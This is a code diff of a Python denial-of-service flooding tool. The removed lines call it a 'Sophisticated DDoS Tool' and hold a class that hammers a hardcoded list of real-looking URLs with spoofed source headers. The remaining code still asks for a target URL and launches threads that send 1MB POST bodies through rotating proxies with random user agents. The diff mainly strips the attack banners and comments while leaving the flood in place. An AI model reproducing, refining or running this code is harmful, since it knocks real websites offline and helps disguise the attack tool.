@@ -8237,8 +8237,7 @@ infinite_loop_urls = [
     "http://portal.veendam.nl"
 ]
 
-# Generate a large payload for each request
-def generate_large_payload(size=10**6):  # Default 1MB payload
+def generate_large_payload(size=10**6):
     return "A" * size
 
 class Spammer(threading.Thread):
@@ -8246,7 +8245,7 @@ class Spammer(threading.Thread):
         threading.Thread.__init__(self)
         self.url = url + "?" + "&".join(
             [f"param{random.randint(0, 99999)}={random.randint(0, 99999)}" for _ in range(50)]
-        )  # Larger query string
+        )
         self.num = number
         self.headers = {
             'User-Agent': random.choice(ua),
@@ -8266,91 +8265,32 @@ class Spammer(threading.Thread):
 
     def request(self):
         global N
-        data = generate_large_payload()  # Include a larger body in the request
-        with self.lock:  # Ensure atomic operation for N management
+        data = generate_large_payload()
+        with self.lock:
             proxy = self.proxy_list[N]
-            N = (N + 1) % len(self.proxy_list)  # Rotate proxy index
+            N = (N + 1) % len(self.proxy_list)
 
         proxy_handler = urllib.request.ProxyHandler({'http': proxy})
         opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
 
-        req = urllib.request.Request(self.url, data.encode('utf-8'), self.headers)  # Send large payload
+        req = urllib.request.Request(self.url, data.encode('utf-8'), self.headers)
         urllib.request.urlopen(req)
-
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS Attack in Progress")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL, end="")
 
         sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Proxy: {proxy}")
         sys.stdout.flush()
         sys.stdout.write("\r")
 
     def run(self):
-        self.lock.acquire()
         print(f"Thread #{self.num:4d} | Starting")
-        self.lock.release()
         time.sleep(1)
         while True:
             try:
                 self.request()
             except Exception as e:
                 print(f"Error in thread #{self.num}: {e}")
-        sys.exit(0)
-
-class InfiniteLoopRequester(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
-
-    def run(self):
-        while True:
-            for url in infinite_loop_urls:
-                try:
-                    headers = {
-                        'User-Agent': random.choice(ua),
-                        'Keep-Alive': random.randint(110, 9960),
-                        'Referer': random.choice(ref),
-                        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-                        'Accept-Encoding': 'gzip;q=0,deflate;q=0',
-                        'Connection': 'Keep-Alive',
-                        'Cache-Control': 'no-cache, no-store, must-revalidate',
-                        'Cache-directive': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'Upgrade-Insecure-Requests': '1',
-                        'X-Forwarded-For': random.choice(spoofed_ips),
-                    }
-                    data = generate_large_payload()
-                    req = urllib.request.Request(url, data.encode('utf-8'), headers)
-                    urllib.request.urlopen(req)
-
-                    print(Fore.GREEN + f"Request sent to {url} with spoofed IP {headers['X-Forwarded-For']}")
-                except Exception as e:
-                    print(Fore.RED + f"Error requesting {url}: {e}")
 
 class MainLoop:
-    def __init__(self):
-        if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
-            self.title()
-
-    def title(self):
-        sys.stdout.write("                                                                                          \n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
-        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
-        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("\n")
-
-    def check_url(self, url):
-        if url[:4] == "www.":
-            url = "https://" + url
-        elif url[:4] == "http":
-            pass
-        else:
-            url = "https://" + url
-        return url
-
     def setup(self):
         global N
         N = 0
@@ -8360,10 +8300,11 @@ class MainLoop:
             print(Fore.RED + "0000000000000000000000000000")
             print(Style.RESET_ALL)
             url = input('> Enter the target URL to DoS: ')
-            url = self.check_url(url)
+            if not url.startswith(("http://", "https://")):
+                url = "https://" + url
             try:
                 req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-                response = urllib.request.urlopen(req)
+                urllib.request.urlopen(req)
                 break
             except:
                 print('> Could not open the specified URL.')
@@ -8387,9 +8328,7 @@ class MainLoop:
         for i in range(num_threads):
             Spammer(url, i + 1, proxy_list).start()
 
-        # Start the infinite loop requester
-        InfiniteLoopRequester().start()
-
 if __name__ == '__main__':
     b = MainLoop()
     b.setup()
+
